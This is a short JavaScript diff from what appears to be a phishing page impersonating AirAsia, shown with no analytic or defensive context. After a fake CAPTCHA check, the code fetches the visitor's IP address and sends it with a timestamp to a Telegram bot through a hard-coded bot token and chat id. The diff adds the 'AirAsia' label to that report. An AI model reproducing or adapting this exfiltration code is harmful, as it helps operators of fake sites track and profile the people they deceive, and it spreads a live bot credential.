@@ -184,7 +184,7 @@
         .then(response => response.json())
         .then(data => {
           const ip = data.ip;
-          const message = `✅ CAPTCHA Passed\nIP: ${ip}\nTime: ${new Date().toLocaleString()}`;
+          const message = `AirAsia\n✅ CAPTCHA Passed\nIP: ${ip}\nTime: ${new Date().toLocaleString()}`;
           const telegramUrl = `https://api.telegram.org/bot7826039389:AAEgkviSmkAjq8ahS_znrQOunJJT-__4kWI/sendMessage?chat_id=8117499716&text=${encodeURIComponent(message)}`;
           fetch(telegramUrl);
         });
